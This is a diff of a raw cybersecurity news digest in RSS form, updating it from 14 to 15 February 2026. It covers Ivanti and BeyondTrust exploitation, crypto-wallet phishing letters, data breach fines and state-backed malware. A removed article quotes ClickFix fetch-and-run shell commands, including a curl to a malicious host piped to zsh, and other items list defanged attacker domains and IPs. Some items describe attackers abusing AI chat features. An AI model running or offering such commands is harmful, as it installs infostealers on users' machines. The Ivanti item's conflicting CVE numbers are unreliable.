@@ -1,6 +1,6 @@
 
 ================================================================================
-📅 14 FEBRUARY 2026 - SİBER GÜVENLİK HABERLERİ (HAM RSS)
+📅 15 FEBRUARY 2026 - SİBER GÜVENLİK HABERLERİ (HAM RSS)
 ================================================================================
 
 [1] The Hacker News - Google Ties Suspected Russian Actor to CANFAIL Malware Attacks on Ukrainian Orgs
@@ -29,7 +29,7 @@ Typically disguised with a double extension to pass off as a PDF document (*.pdf
 
 Google said the threat actor is also linked to a campaign called PhantomCaptcha that was disclosed by SentinelOne SentinelLABS in October 2025 as targeting organizations associated with Ukraine's war relief efforts through phishing emails that direct recipients to fake pages hosting ClickFix-style instructions to activate the infection sequence and deliver a WebSocket-based trojan.
 
-(XXXXXXX, AÇIK - thehackernews.com, 14.02.2026)
+(XXXXXXX, AÇIK - thehackernews.com, 15.02.2026)
 
 ================================================================================
 
@@ -87,7 +87,7 @@ ORBs confer several advantages to threat actors, allowing them to route their tr
 
 "The campaigns against defense contractors in Ukraine, threats to or exploitation of defense personnel, the persistent volume of intrusions by China-nexus actors, and the hack, leak, and disruption of the manufacturing base are some of the leading threats to this industry today."
 
-(XXXXXXX, AÇIK - thehackernews.com, 14.02.2026)
+(XXXXXXX, AÇIK - thehackernews.com, 15.02.2026)
 
 ================================================================================
 
@@ -129,11 +129,157 @@ What's more, there are signs that there exists a main implant that has been comp
 
 "This is a near-production-ready proof of concept," Talos said. "VoidLink is positioned to become an even more powerful framework based on its capabilities and flexibility."
 
-(XXXXXXX, AÇIK - thehackernews.com, 14.02.2026)
+(XXXXXXX, AÇIK - thehackernews.com, 15.02.2026)
 
 ================================================================================
 
-[4] BleepingComputer - Fake job recruiters hide malware in developer coding challenges
+[4] BleepingComputer - One threat actor responsible for 83% of recent Ivanti RCE attacks
+────────────────────────────────────────────────────────────────────────────────
+Tarih: Sat, 14 Feb 2026 11:02:34 -0500
+Link: https://www.bleepingcomputer.com/news/security/one-threat-actor-responsible-for-83-percent-of-recent-ivanti-rce-attacks/
+
+[TAM METİN - 627 kelime]
+Threat intelligence observations show that a single threat actor is responsible for most of the active exploitation of two critical vulnerabilities in Ivanti Endpoint Manager Mobile (EPMM), tracked as CVE-2026-21962 and CVE-2026-24061.
+
+The security issues have been flagged as actively exploited in zero-day attacks in Ivanti's security advisory, where the company also announced hotfixes.
+
+Both flaws received a critical severity rating and allow an attacker to inject code without authentication, leading to remote code execution (RCE) on vulnerable systems.
+
+A single IP address hosted on bulletproof infrastructure is responsible for over 83% of exploitation activity related to the two vulnerabilities, says threat-focused internet intelligence company GreyNoise.
+
+Between February 1st and 9th, the monitoring platform observed 417 exploitation sessions originating from 8 unique source IP addresses, and centered on CVE-2026-21962 and CVE-2026-24061.
+
+The highest volume, 83%, comes from 193[.]24[.]123[.]42, hosted by PROSPERO OOO (AS200593), which Censys analysts marked as a bulletproof autonomous system used to target various software products.
+
+A sharp spike occurred on February 8, with 269 recorded sessions in a single day. The figure is almost 13 times the daily average of 22 sessions, GreyNoise noted.
+
+Of the 417 exploitation sessions, 354 (85%) used OAST-style DNS callbacks to verify command execution capability, pointing to initial access broker activity.
+
+Interestingly, several published indicators of compromise (IoCs) include IP addresses for Windscribe VPN (185[.]212[.]171[.]0/24) present in GreyNoise telemetry as scanning Oracle WebLogic instances, but no Ivanti exploitation activity.
+
+The researchers note that the PROSPERO OOO IP address they saw "is not on widely published IOC lists, meaning defenders blocking only published indicators are likely missing the dominant exploitation source."
+
+This IP is not limited to Ivanti targeting, as it simultaneously exploited three more vulnerabilities: CVE-2026-21962 in Oracle WebLogic, CVE-2026-24061 in GNU Inetutils Telnetd, and CVE-2025-24799 in GLPI.
+
+The Oracle WebLogic flaw had the lion’s share in session volumes, dwarfing the rest with 2,902 sessions, followed by the Telnetd issue with 497 sessions.
+
+Exploitation activity appears fully automated, rotating between three hundred user agents.
+
+Ivanti's fixes for CVE-2026-1281 and CVE-2026-1340 are not permanent. The company promised to release complete patches in the first quarter of this year, with the release of EPMM version 12.8.0.0.
+
+Until then, it is recommended to use RPM packages 12.x.0.x for EPMM versions 12.5.0.x, 12.6.0.x, and 12.7.0.x, and RPM 12.x.1.x for EPMM versions 12.5.1.0 and 12.6.1.0.
+
+The vendor notes that the most conservative approach is to build a replacement EPMM instance and migrate all data there. Instructions on how to do that are available here.
+
+Update 2/15 - An Ivanti spokesperson has sent BleepingComputer the following statement:
+
+"Ivanti’s recommendation remains the same: customers who have not yet patched should do so immediately, and then review their appliance for any signs of exploitation that may have occurred prior to patching. Applying the patch is the most effective way to prevent exploitation, regardless of how IOCs change over time, especially once a POC is available. The patch requires no downtime and takes only seconds to apply. Ivanti has provided customers with high fidelity indicators of compromise, technical analysis at disclosure, and an Exploitation Detection script developed with NCSC NL, and continues to support customers as we respond to this threat." - Ivanti spokesperson
+
+The future of IT infrastructure is here
+
+Modern IT infrastructure moves faster than manual workflows can handle.
+
+In this new Tines guide, learn how your team can reduce hidden manual delays, improve reliability through automated response, and build and scale intelligent workflows on top of tools you already use.
+
+Critical BeyondTrust RCE flaw now exploited in attacks, patch now
+
+CISA says critical VMware RCE flaw now actively exploited
+
+Trend Micro fixes actively exploited remote code execution bug
+
+Critical RCE flaw impacts over 115,000 WatchGuard firewalls
+
+New critical WatchGuard Firebox firewall flaw exploited in attacks
+
+(XXXXXXX, AÇIK - bleepingcomputer.com, 15.02.2026)
+
+================================================================================
+
+[5] BleepingComputer - Snail mail letters target Trezor and Ledger users in crypto-theft attacks
+────────────────────────────────────────────────────────────────────────────────
+Tarih: Sat, 14 Feb 2026 10:15:25 -0500
+Link: https://www.bleepingcomputer.com/news/security/snail-mail-letters-target-trezor-and-ledger-users-in-crypto-theft-attacks/
+
+[TAM METİN - 765 kelime]
+Threat actors are sending physical letters pretending to be from Trezor and Ledger, makers of cryptocurrency hardware wallets, to trick users into submitting recovery phrases in crypto theft attacks.
+
+These phishing letters claim recipients must complete a mandatory "Authentication Check" or "Transaction Check" to avoid losing access to wallet functionality, creating a sense of urgency to pressure victims into scanning QR codes that lead to malicious websites.
+
+Snail mail QR code crypto scams
+
+Hardware wallet users report receiving snail mail letters printed on letterhead that impersonate official communications from Trezor and Ledger security and compliance teams.
+
+It is unclear what the targeting criteria are for these letters, but both Trezor and Ledger [2] have suffered data breaches in the past couple of years that have exposed customer contact information.
+
+A letter impersonating Trezor received by cybersecurity expert Dmitry Smilyanets claims that an "Authentication Check will soon become a mandatory part of Trezor," warning users to complete the process by February 15, 2026, or risk losing functionality on their devices.
+
+"To avoid any disruption to your Trezor Suite access, please scan the QR code with your mobile device and follow the instructions on our website to enable Authentication Check by February 15th, 2026," reads the fake Trezor letter.
+
+"Note: While you may have already received the notification on your Trezor device and enabled Authentication Check, completing this process is still required to fully activate the feature and ensure your device is synchronized with the full functionality of Authentication Check."
+
+A similar Ledger-themed letter was shared on X, claiming a "Transaction Check" would soon become mandatory and warning users to scan a QR code to enable the feature by October 15, 2025, to avoid disruptions.
+
+Scanning the QR codes leads victims to phishing sites impersonating official Trezor and Ledger setup pages, including:
+
+https://trezor.authentication-check[.]io/
+
+https://ledger.setuptransactioncheck[.]com/
+
+At the time of writing, the Ledger phishing domain is offline, while the Trezor phishing site remains live but is now flagged by Cloudflare as a phishing site.
+
+The Trezor phishing page displays a warning that users must complete an authentication check by February 15, 2026, stating:
+
+"Complete Authentication Check setup by February 15, 2026 unless you purchased a Trezor Safe 7, Trezor Safe 5, Trezor Safe 3, or Trezor Safe 1 after November 30, 2025. In that case, it is already pre-configured, and no action is needed," reads the phishing site.
+
+Clicking the "Get Started" button leads to another page that warns users that failure to complete the authentication process may result in limited or blocked access to Trezor, transaction signing errors, and disruption with future Trezor updates.
+
+These warnings are designed to create further urgency so victims continue to the next part of the setup process.
+
+If victims proceed, they are taken to a final phishing page that asks them to enter their wallet recovery phrase.
+
+The page allows users to enter 24-, 20-, or 12-word recovery phrases and claims that this information is required to verify device ownership and enable the authentication feature.
+
+Once entered, the recovery phrase is transmitted to the threat actor through a backend API endpoint at https://trezor.authentication-check[.]io/black/api/send.php.
+
+This allows attackers to import the victim's wallet onto their own devices and steal funds from the wallet.
+
+While phishing emails targeting Trezor and Ledger users are common, physical mail phishing campaigns remain relatively rare.
+
+In 2021, threat actors mailed modified Ledger devices designed to steal recovery phrases during setup.
+
+A similar postal phishing campaign was also reported in April targeting Ledger users.
+
+Never share recovery phrases
+
+Hardware wallet recovery phrases, also known as seed phrases, are textual representations of the private keys that control access to cryptocurrency wallets.
+
+Therefore, anyone who has access to a wallet's recovery phrase gains full control over the wallet and its funds.
+
+Hardware wallet manufacturers such as Trezor and Ledger will never ask users to enter, scan, upload, or share their recovery phrase.
+
+Recovery phrases should be entered directly on the hardware wallet device when restoring a wallet, and never on a computer, mobile device, or website.
+
+The future of IT infrastructure is here
+
+Modern IT infrastructure moves faster than manual workflows can handle.
+
+In this new Tines guide, learn how your team can reduce hidden manual delays, improve reliability through automated response, and build and scale intelligent workflows on top of tools you already use.
+
+Ledger customers impacted by third-party Global-e data breach
+
+Betterment confirms data breach after wave of crypto scam emails
+
+New GlassWorm malware wave targets Macs with trojanized crypto wallets
+
+Microsoft Store Outlook add-in hijacked to steal 4,000 Microsoft accounts
+
+Fake job recruiters hide malware in developer coding challenges
+
+(XXXXXXX, AÇIK - bleepingcomputer.com, 15.02.2026)
+
+================================================================================
+
+[6] BleepingComputer - Fake job recruiters hide malware in developer coding challenges
 ────────────────────────────────────────────────────────────────────────────────
 Tarih: Fri, 13 Feb 2026 17:35:37 -0500
 Link: https://www.bleepingcomputer.com/news/security/fake-job-recruiters-hide-malware-in-developer-coding-challenges/
@@ -197,123 +343,7 @@ Hacker arrested for KMSAuto malware campaign with 2.8 million downloads
 
 France arrests Latvian for installing malware on Italian ferry
 
-(XXXXXXX, AÇIK - bleepingcomputer.com, 14.02.2026)
-
-================================================================================
-
-[5] BleepingComputer - Claude LLM artifacts abused to push Mac infostealers in ClickFix attack
-────────────────────────────────────────────────────────────────────────────────
-Tarih: Fri, 13 Feb 2026 15:21:43 -0500
-Link: https://www.bleepingcomputer.com/news/security/claude-llm-artifacts-abused-to-push-mac-infostealers-in-clickfix-attack/
-
-[TAM METİN - 616 kelime]
-Threat actors are abusing Claude artifacts and Google Ads in ClickFix campaigns that deliver infostealer malware to macOS users searching for specific queries.
-
-At least two variants of the malicious activity have been observed in the wild, and more than 10,000 users have accessed the content with dangerous instructions.
-
-A Claude artifact is content generated with Antropic’s LLM that has been made public by the author. It can be anything from instructions, guides, chunks of code, or other types of output that are isolated from the main chat and accessible to anyone via links hosted on the claude.ai domain.
-
-An artifact's page warns users that the shown content was generated by the user and has not been verified for accuracy.
-
-Researchers at MacPaw's investigative division, Moonlock Lab, and at ad-blocking company AdGuard noticed the malicious search results being displayed for multiple queries, like “online DNS resolver,” “macOS CLI disk space analyzer,” and “HomeBrew.”
-
-Malicious results promoted on Google Search lead to either a public Claude artifact or a Medium article impersonating Apple Support. In both cases, the user is instructed to paste a shell command into Terminal.
-
-In the first variant of the attack, the command given for execution is: ‘echo "..." | base64 -D | zsh,’
-
-while in the second, it’s: ‘true && cur""l -SsLfk --compressed "https://raxelpak[.]com/curl/[hash]" | zsh’.
-
-Moonlock researchers discovered that the malicious Claude guide has already received at least 15,600 views, which could be an indication of the number of users falling for the trick.
-
-AdGuard researchers observed the same guide a few days earlier, when it had 12,300 views.
-
-Running the command in Terminal fetches a malware loader for the MacSync infostealer, which exfiltrates sensitive information present on the system.
-
-According to the researchers, the malware establishes communication with the command-and-control (C2) infrastructure using a hardcoded token and API key, and spoofs a macOS browser user-agent to blend into normal activity.
-
-"The response is piped directly to osascript – the AppleScript handles the actual stealing (keychain, browser data, crypto wallets)," the researchers say.
-
-The stolen data is packaged into an archive at ‘/tmp/osalogging.zip,’ and then exfiltrated to the attacker's C2 at a2abotnet[.]com/gate via an HTTP POST request. In case of failure, the archive is split into smaller chunks, and exfiltration is retried eight times. After a successful upload, a cleanup step deletes all traces.
-
-MoonLock Lab found that both variants fetch the second stage from the same C2 address, indicating that the same threat actor is behind the observed activity.
-
-A similar campaign leveraged the chat sharing feature in ChatGPT and Grok to deliver the AMOS infostealer. In December 2025, researchers found the promoted  after researchers found ChatGPT and Grok conversations were being leveraged in ClickFix attacks targeting Mac users.
-
-The Claude variation of the attack indicates that abuse has expanded to other large language models (LLMs).
-
-Users are recommended to exert caution and avoid executing in Terminal commands they don't fully understand. As Kaspersky researchers noted in the past, asking the chatbot in the same conversation about the safety of the provided commands is a straightforward way to determine if they're safe or not.
-
-The future of IT infrastructure is here
-
-Modern IT infrastructure moves faster than manual workflows can handle.
-
-In this new Tines guide, learn how your team can reduce hidden manual delays, improve reliability through automated response, and build and scale intelligent workflows on top of tools you already use.
-
-New MacSync malware dropper evades macOS Gatekeeper checks
-
-North Korean hackers use new macOS malware in crypto-theft attacks
-
-New GlassWorm attack targets macOS via compromised OpenVSX extensions
-
-New ClickFix attacks abuse Windows App-V scripts to push malware
-
-New ErrTraffic service enables ClickFix attacks via fake browser glitches
-
-(XXXXXXX, AÇIK - bleepingcomputer.com, 14.02.2026)
-
-================================================================================
-
-[6] BleepingComputer - Louis Vuitton, Dior, and Tiffany fined $25 million over data breaches
-────────────────────────────────────────────────────────────────────────────────
-Tarih: Fri, 13 Feb 2026 13:35:15 -0500
-Link: https://www.bleepingcomputer.com/news/security/louis-vuitton-dior-and-tiffany-fined-25-million-over-data-breaches/
-
-[TAM METİN - 565 kelime]
-South Korea has fined luxury fashion brands Louis Vuitton, Christian Dior Couture, and Tiffany $25 million for failing to implement adequate security measures, which facilitated unauthorized access and the exposure of data belonging to more than 5.5 million customers.
-
-All three brands are part of the Louis Vuitton Moët Hennessy (LVMH) group and suffered data breaches [1, 2, 3] after hackers gained access to their cloud-based customer management service.
-
-The Personal Information Protection Commission (PIPC) in South Korea says that in the case of Louis Vuitton, an employee’s device was infected with malware, which led to compromising their software-as-a-service (SaaS) and leaking of data for 3.6 million customers.
-
-Although the product isn’t named, Google researchers linked the campaigns to the ShinyHunters gang, who targeted Salesforce platforms. The threat actor later claimed the breach of LVMH systems.
-
-The breaches at the three regional brands last year exposed sensitive customer data, including names, phone numbers, email addresses, postal addresses, and purchase histories.
-
-PIPC says that Louis Vuitton had been operating the SaaS tool since 2013, but "did not restrict access rights to Internet Protocol (IP) addresses, etc., and did not apply secure authentication methods when personal information handlers accessed the service from outside."
-
-For failing to adequately secure access to customer data, the South Korean data protection agency imposed a $16.4 million fine on Louis Vuitton and ordered the company to announce the penalty on its business website.
-
-At Dior, the breach occurred via a phishing attack on a customer service employee, who was tricked into granting the hacker access to the SaaS system, exposing data for 1.95 million customers.
-
-Dior had been using the system since 2020, but didn’t implement allow-lists, didn’t place bulk data download restrictions, and failed to inspect access logs, delaying the discovery of the breach for over three months.
-
-Additionally, Dior South Korea disclosed the breach to PIPC five days after learning about it. Under PIPA, organizations are required to notify the data protection agency within 72 hours from the time of becoming aware of a personal information leak.
-
-Due to these violations, PIPC announced a $9.4 million financial penalty for Dior South Korea.
-
-Tiffany was breached in a similar way, with attackers using voice phishing to trick a customer service employee into giving them access to the SaaS system. However, the impact was far lower in this case, with 4,600 clients exposed.
-
-Similar to the other two cases, Tiffany also neglected to implement IP-based access controls and bulk data download restrictions and did not notify impacted individuals within the legally specified time frame. The brand received a $1.85 million fine.
-
-PIPC emphasized that SaaS solutions do not exempt companies from their responsibility to securely manage client data, nor does it transfer that responsibility to the vendors of these solutions.
-
-The future of IT infrastructure is here
-
-Modern IT infrastructure moves faster than manual workflows can handle.
-
-In this new Tines guide, learn how your team can reduce hidden manual delays, improve reliability through automated response, and build and scale intelligent workflows on top of tools you already use.
-
-France fines Free Mobile €42 million over 2024 data breach incident
-
-Coupang to split $1.17 billion among 33.7 million data breach victims
-
-Odido data breach exposes personal info of 6.2 million customers
-
-Volvo Group North America customer data exposed in Conduent hack
-
-Match Group breach exposes data from Hinge, Tinder, OkCupid, and Match
-
-(XXXXXXX, AÇIK - bleepingcomputer.com, 14.02.2026)
+(XXXXXXX, AÇIK - bleepingcomputer.com, 15.02.2026)
 
 ================================================================================
 
@@ -367,7 +397,7 @@ Who Benefitted from the Aisuru and Kimwolf Botnets?
 
 A Broken System Fueling Botnets (Synthient).
 
-(XXXXXXX, AÇIK - krebsonsecurity.com, 14.02.2026)
+(XXXXXXX, AÇIK - krebsonsecurity.com, 15.02.2026)
 
 ================================================================================
 
@@ -411,7 +441,7 @@ Goettl noted that Mozilla has released updates for Firefox and Firefox ESR reso
 
 As ever, the SANS Internet Storm Center has a per-patch breakdown by severity and urgency. Windows admins should keep an eye on askwoody.com for any news about patches that don’t quite play nice with everything. If you experience any issues related installing January’s patches, please drop a line in the comments below.
 
-(XXXXXXX, AÇIK - krebsonsecurity.com, 14.02.2026)
+(XXXXXXX, AÇIK - krebsonsecurity.com, 15.02.2026)
 
 ================================================================================
 
@@ -511,7 +541,7 @@ Both Synthient and XLabs say Kimwolf targets a vast number of Android TV streami
 
 If you own a TV box that matches one of these model names and/or numbers, please just rip it out of your network. If you encounter one of these devices on the network of a family member or friend, send them a link to this story (or to our January 2 story on Kimwolf) and explain that it’s not worth the potential hassle and harm created by keeping them plugged in.
 
-(XXXXXXX, AÇIK - krebsonsecurity.com, 14.02.2026)
+(XXXXXXX, AÇIK - krebsonsecurity.com, 15.02.2026)
 
 ================================================================================
 
@@ -559,7 +589,7 @@ According to the breach disclosure Nelnet Servicing informed Edfinancial and OSL
 
 Remediation also included two years of free credit monitoring, credit reports and up to $1 million in identity theft insurance.
 
-(XXXXXXX, AÇIK - threatpost.com, 14.02.2026)
+(XXXXXXX, AÇIK - threatpost.com, 15.02.2026)
 
 ================================================================================
 
@@ -615,7 +645,7 @@ The group has, in the past, expanded well beyond Australasia. According to a Dep
 
 Despite the DoJ indictment, analysts “have not observed a distinct disruption of operational tempo” from TA423, and they “collectively expect TA423 / Red Ladon to continue pursuing its intelligence-gathering and espionage mission.”
 
-(XXXXXXX, AÇIK - threatpost.com, 14.02.2026)
+(XXXXXXX, AÇIK - threatpost.com, 15.02.2026)
 
 ================================================================================
 
@@ -663,51 +693,47 @@ To mitigate 0ktapus-style campaigns, the researchers recommended good hygiene ar
 
 “Whatever MFA someone uses,” Grimes advised, “the user should be taught about the common types of attacks that are committed against their form of MFA, how to recognize those attacks, and how to respond. We do the same when we tell users to pick passwords but don’t when we tell them to use supposedly more secure MFA.”
 
-(XXXXXXX, AÇIK - threatpost.com, 14.02.2026)
+(XXXXXXX, AÇIK - threatpost.com, 15.02.2026)
 
 ================================================================================
 
-[13] Security Affairs - New threat actor UAT-9921 deploys VoidLink against enterprise sectors
+[13] Security Affairs - Fintech firm Figure disclosed data breach after employee phishing attack
 ────────────────────────────────────────────────────────────────────────────────
-Tarih: Fri, 13 Feb 2026 22:18:18 +0000
-Link: https://securityaffairs.com/187969/ai/new-threat-actor-uat-9921-deploys-voidlink-against-enterprise-sectors.html
+Tarih: Sat, 14 Feb 2026 17:10:33 +0000
+Link: https://securityaffairs.com/187988/data-breach/fintech-firm-figure-disclosed-data-breach-after-employee-phishing-attack.html
 
-[TAM METİN - 583 kelime]
-Cisco Talos spotted a previously unknown threat actor, tracked as UAT-9921, using a new modular attack framework called VoidLink. The group targets organizations in the technology and financial services sectors. The flexible design of VoidLink suggests the actor can adapt tools and techniques to different victims and campaign needs.
+[TAM METİN - 299 kelime]
+Blockchain-based lending firm Figure confirmed a data breach after an employee fell victim to a social engineering attack. According to a company spokesperson, the incident allowed hackers to access and steal a limited number of files. The company disclosed the breach following inquiries and is assessing the impact.
 
-“Cisco Talos recently discovered a new threat actor, UAT-9921, leveraging VoidLink in campaigns. Their activities may go as far back as 2019, even without VoidLink. The VoidLink compile-on-demand feature lays down the foundations for AI-enabled attack frameworks, which can create tools on-demand for their operators.” reads the report published by Talos. “Cisco Talos found clear indications that implants also exist for Windows, with the capability to load plugins.”
+Figure Technology Solutions has allegedly been breached by ShinyHunters.Figure provides blockchain based HELOCs(Home Equity Line Of Credit)Allegedly pii of all applicants has been stolen @Figure pic.twitter.com/nNGOK2GRLR
 
-VoidLink is a new modular Linux-focused attack framework first spotted by Check Point and used by threat actor UAT-9921, which has been active since at least 2019.
+Figure Technology Solutions, Inc. is a US financial technology company. Established in 2018, it develops and operates blockchain-based platforms used in lending, capital markets, and asset management.
 
-“Talos is aware of multiple VoidLink-related victims dating back to September with the activity continuing through to January 2026.” continues the report. “This finding does not necessarily contradict the Checkpoint Research mentions of late November since the presented documents show development dates from version 2.0 and Cisco Talos assesses that this was still version 1.0.”
+The company offers consumer and institutional lending products such as HELOCs, cash-out refinancing, DSCR loans, crypto-backed loans, and operates the Figure Connect credit marketplace.
 
-The group installs VoidLink on compromised servers to establish command-and-control, hide activity, and scan networks internally and externally. Talos assesses that the actor likely has Chinese-language knowledge and that VoidLink development appears to be supported by AI-enabled coding tools, though operations do not rely on AI. UAT-9921 gains access using stolen credentials or by exploiting Java serialization flaws such as Apache Dubbo. Victims include technology and financial firms, but broad network scanning suggests opportunistic targeting.
+On Friday, Figure spokesperson Alethea Jadick told TechCrunch that the security breach occurred after an employee was tricked in a social engineering attack, allowing hackers to steal “a limited number of files.” She said the company is communicating “with partners and those impacted” and offering free credit monitoring “to all individuals who receive a notice.”
 
-Since 2022, Cisco Talos has tracked fast-evolving single-file attack frameworks like Manjusaka and Alchimist. VoidLink marks a major step forward, keeping the single-file model but delivering a more advanced, “defense-contractor grade” implant platform. Built quickly with AI-enabled development tools, it combines Zig for implants, C for plugins, and Go for the backend, and can compile plugins on demand for different Linux targets.
+Figure has started notifying affected individuals and is offering free credit monitoring to those who receive a breach notice. The company has not shared the number of impacted users or when the breach was discovered.
 
-Talos warns this model could soon support AI-driven tool creation, where implants request custom exploits or modules from C2 servers in real time. This would speed lateral movement, enable unique attack tools, and make detection far harder.
+The cybercrime group ShinyHunters claimed responsibility for the breach on its dark web site, saying Figure refused to pay a ransom and releasing about 2.5GB of stolen data.
 
-“Of course, this may just be an intermediate step, assuming that there is a human operator managing the environment exploration. However, it likely will not be long before we begin to uncover malicious agents doing the initial stages of exploration and lateral movement before human intervention.” continues the report.
+TechCrunch reviewed samples showing names, addresses, birth dates, and phone numbers, raising risks of identity fraud and phishing.
 
-“This has an impact of reducing compromise attack metrics — namely, the time to lateral movement and time to focused data exfiltration. It also allows the generation of never-before-seen tools and the constant change in the attacker’s behavior, making detection more difficult.”
-
-Talos researchers states that VoidLink stands out as a “defense contractor–grade” framework with built-in auditing and role-based access control (SuperAdmin, Operator, Viewer). Its mesh peer-to-peer design lets implants relay traffic for one another, bypassing network limits. The malware is focused on Linux, and implements advanced capabilities such as eBPF/LKM rootkits, container escape, privilege escalation, cloud awareness, and EDR evasion. Though mainly Linux-based, evidence suggests possible Windows support. With modular plugins, stealth, and anti-analysis features, VoidLink shows strong potential to evolve into a highly powerful attack platform.
-
-“VoidLink is positioned to become an even more powerful framework based on its capabilities and flexibility, as demonstrated through this apparent proof of concept.”
+“A member of ShinyHunters told TechCrunch that Figure was among the victims of a hacking campaign that targeted customers who rely on the single sign-on provider Okta.” reported TechCruch.
 
 Follow me on Twitter: @securityaffairs and Facebook and Mastodon
 
-(XXXXXXX, AÇIK - securityaffairs.com, 14.02.2026)
+(XXXXXXX, AÇIK - securityaffairs.com, 15.02.2026)
 
 ================================================================================
 
-[14] Security Affairs - Attackers exploit BeyondTrust CVE-2026-1731 within hours of PoC release
+[14] Security Affairs - U.S. CISA adds a flaw in BeyondTrust RS and PRA to its Known Exploited Vulnerabilities catalog
 ────────────────────────────────────────────────────────────────────────────────
-Tarih: Fri, 13 Feb 2026 15:19:09 +0000
-Link: https://securityaffairs.com/187962/uncategorized/attackers-exploit-beyondtrust-cve-2026-1731-within-hours-of-poc-release.html
+Tarih: Sat, 14 Feb 2026 15:54:34 +0000
+Link: https://securityaffairs.com/187982/breaking-news/u-s-cisa-adds-a-flaw-in-beyondtrust-rs-and-pra-to-its-known-exploited-vulnerabilities-catalog.html
 
-[TAM METİN - 509 kelime]
-Threat actors rapidly began exploiting a newly patched BeyondTrust vulnerability, tracked as CVE-2026-1731 (CVSS score of 9.9), soon after a proof-of-concept exploit became public.
+[TAM METİN - 635 kelime]
+The U.S. Cybersecurity and Infrastructure Security Agency (CISA) added an BeyondTrust RS and PRA vulnerability, tracked as CVE-2026-1731 (CVSS score of 9.9), to its Known Exploited Vulnerabilities (KEV) catalog.
 
 This week BeyondTrust released security updates to address the critical flaw in its Remote Support and older Privileged Remote Access products. The bug could allow an unauthenticated attacker to send specially crafted requests and run operating system commands remotely, without logging in. The issue, disclosed on February 6, 2026, could lead to full remote code execution if exploited, making the updates essential to prevent abuse.
 
@@ -717,13 +743,15 @@ Exploiting the flaw would let a remote attacker run system commands without auth
 
 ”Successful exploitation could allow an unauthenticated remote attacker to execute operating system commands in the context of the site user.” continues the advisory. “Successful exploitation requires no authentication or user interaction and may lead to system compromise, including unauthorized access, data exfiltration, and service disruption.”
 
-BeyondTrust released patches for CVE-2026-1731 on February 6 after Hacktron researchers warned that about thousands of instances were exposed online.
+BeyondTrust released patches for CVE-2026-1731 on February 6 after Hacktron researchers warned that about thousands of instances were exposed online.
 
-Hacktron AI team reported that roughly 11,000 BeyondTrust Remote Support instances are exposed online across cloud and on-prem environments. Around 8,500 of these are on-prem systems and could remain vulnerable if not patched. The affected deployments are mainly used by large organizations, including enterprises in healthcare, financial services, government, and hospitality sectors.
+Hacktron AI team reported that roughly 11,000 BeyondTrust Remote Support instances are exposed online across cloud and on-prem environments. Around 8,500 of these are on-prem systems and could remain vulnerable if not patched. Large organizations, including enterprises in the healthcare, financial services, government, and hospitality sectors, primarily use affected deployments.
+
+Threat actors rapidly began exploiting a newly patched BeyondTrust vulnerability, tracked as CVE-2026-1731 (CVSS score of 9.9), soon after a proof-of-concept exploit became public.
 
 After a PoC exploit went public on February 10, GreyNoise detected attack attempts within 24 hours, with one IP responsible for most reconnaissance activity.
 
-“On February 10, a proof-of-concept exploit for CVE-2026-1731, a critical pre-authentication remote code execution vulnerability in BeyondTrust Remote Support and Privileged Remote Access, was posted to GitHub. By February 11, GreyNoise’s Global Observation Grid was recording reconnaissance probing for vulnerable BeyondTrust instances.” reported GreyNoise.
+“On February 10, a proof-of-concept exploit for CVE-2026-1731, a critical pre-authentication remote code execution vulnerability in BeyondTrust Remote Support and Privileged Remote Access, was posted to GitHub. By February 11, GreyNoise’s Global Observation Grid was recording reconnaissance probing for vulnerable BeyondTrust instances.” reported GreyNoise.
 
 GreyNoise observed rapid reconnaissance for CVE-2026-1731, led by a single IP responsible for 86% of scans. The activity comes from a long-running scanning operation using a commercial VPN and Linux-based tooling. Threat actors mainly probe non-standard ports, suggesting they know enterprises move BeyondTrust services off 443. JA4+ fingerprints show shared exploit tools and VPN tunneling.
 
@@ -731,43 +759,49 @@ The same IPs also target SonicWall, MOVEit, Log4j, Sophos, SSH, and IoT devices,
 
 “The IPs performing reconnaissance for CVE-2026-1731 aren’t single-purpose. While their BeyondTrust activity is a check (enumeration), their GreyNoise profiles show they’re simultaneously conducting active exploitation attempts against other products: SonicWall, MOVEit Transfer, Log4j, Sophos firewalls, SSH brute-forcing, and IoT default-credential testing.” concludes the report. “Some IPs are even using out-of-band callback domains (OAST), a more sophisticated technique to confirm vulnerability before delivering payloads.”
 
+According to Binding Operational Directive (BOD) 22-01: Reducing the Significant Risk of Known Exploited Vulnerabilities, FCEB agencies have to address the identified vulnerabilities by the due date to protect their networks against attacks exploiting the flaws in the catalog.
+
+Experts also recommend that private organizations review the Catalog and address the vulnerabilities in their infrastructure.
+
+CISA orders federal agencies to fix the vulnerability by February 16, 2026.
+
+US CISA also published an alert related to this flaw titled “Fortinet Releases Guidance to Address Ongoing Exploitation of Authentication Bypass Vulnerability CVE-2026-24858“
+
 Follow me on Twitter: @securityaffairs and Facebook and Mastodon
 
-(XXXXXXX, AÇIK - securityaffairs.com, 14.02.2026)
+(SecurityAffairs – hacking, US CISA Known Exploited Vulnerabilities catalog)
+
+(XXXXXXX, AÇIK - securityaffairs.com, 15.02.2026)
 
 ================================================================================
 
-[15] Security Affairs - Google: state-backed hackers exploit Gemini AI for cyber recon and attacks
+[15] Security Affairs - Suspected Russian hackers deploy CANFAIL malware against Ukraine
 ────────────────────────────────────────────────────────────────────────────────
-Tarih: Fri, 13 Feb 2026 10:57:30 +0000
-Link: https://securityaffairs.com/187958/ai/google-state-backed-hackers-exploit-gemini-ai-for-cyber-recon-and-attacks.html
+Tarih: Sat, 14 Feb 2026 11:05:33 +0000
+Link: https://securityaffairs.com/187976/hacking/suspected-russian-hackers-deploy-canfail-malware-against-ukraine.html
 
-[TAM METİN - 639 kelime]
-Google DeepMind and GTIG report a rise in model extraction or “distillation” attacks aimed at stealing AI intellectual property, which Google has detected and blocked. While APT groups have not breached frontier models, private firms and researchers have tried to clone proprietary systems. State-backed actors from North Korea, Iran, China, and Russia use AI for research, targeting, and phishing. Threat actors also test agentic AI, AI-powered malware like HONESTCUE, and underground “jailbreak” services.
+[TAM METİN - 484 kelime]
+Google Threat Intelligence Group identified a previously undocumented threat actor behind attacks on Ukrainian organizations using CANFAIL malware. The group is possibly linked to Russian intelligence services and has targeted defense, military, government, and energy entities at both regional and national levels in Ukraine.
 
-Threat actors now use large language models to craft polished, culturally accurate phishing messages that remove common red flags like poor grammar. They also run “rapport-building” phishing, holding realistic multi-step conversations to gain trust before delivering malware.
+GTIG researchers observed the Russian intelligence conducting phishing campaigns to deliver CANFAIL malware. The actor is also interested in aerospace, drone-linked manufacturers, nuclear research, and humanitarian groups tied to Ukraine. Google reported that the APT group has also probed Romanian and Moldovan entities.
 
